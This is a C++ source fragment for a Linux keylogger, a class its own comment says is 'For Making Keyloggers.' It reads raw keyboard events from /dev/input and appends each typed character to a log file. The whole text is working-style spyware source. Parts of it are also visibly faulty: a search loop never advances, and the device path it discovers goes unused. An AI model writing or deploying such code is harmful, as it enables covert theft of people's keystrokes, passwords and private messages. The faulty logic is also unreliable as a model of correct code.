FILE* fpr;

// Keyboard Class, For Making Keyloggers.

class KeyboardTools{
    private:
	FILE* outputfd;

        const char* iDevs="/proc/bus/input/devices";
        const char* map="..1234567890-=\b\tqwertyuiop[]..asdfghjkl;'..\\zxcvbnm../";

        char iPath[19]="/dev/input/";
        char  Dump[5000];
        char* TargetEvent;
        char* TargetHandl;

        struct input_event ie;

    public:

	char* GetEventFile(){
        	int fd=open(iDevs, O_RDONLY);
                if (fd<0){
			return NULL;
        	}

                if (read(fd, Dump, 5000)==-1)exit(2);
                do{
			TargetHandl=strstr(Dump, "Handlers=");
                	TargetEvent=strstr(Dump, "EV=");
                }

		while(TargetHandl && TargetEvent && strncmp(TargetEvent+3, "120013", 6) != 0);
                if (TargetHandl && TargetEvent){
			strncat(iPath, strstr(TargetHandl, "event"), 7);
                        return iPath;
		}
                else
			exit(1);
                return 0x00;
       }
       FILE* OutputTo(const char* file){
		return (fpr=(outputfd=fopen(file, "a")));
       }

       void run(){
		int fd=open("/dev/input/event0", O_RDONLY);
		printf ("K OPENED WITH %i\n", fd);
                if (fd<0)return;
		while (read(fd, &ie, sizeof(struct input_event))!=-1){
			if (ie.type==EV_KEY && ie.value==0)
				switch(ie.code){
					case 28:
						fprintf(outputfd, "\n");
						break;
					case 57:
						fprintf(outputfd, " ");
						break;
					default:
 						fprintf(outputfd, "%c", map[ie.code]);
				}

					fflush(outputfd);
		}
       }

};

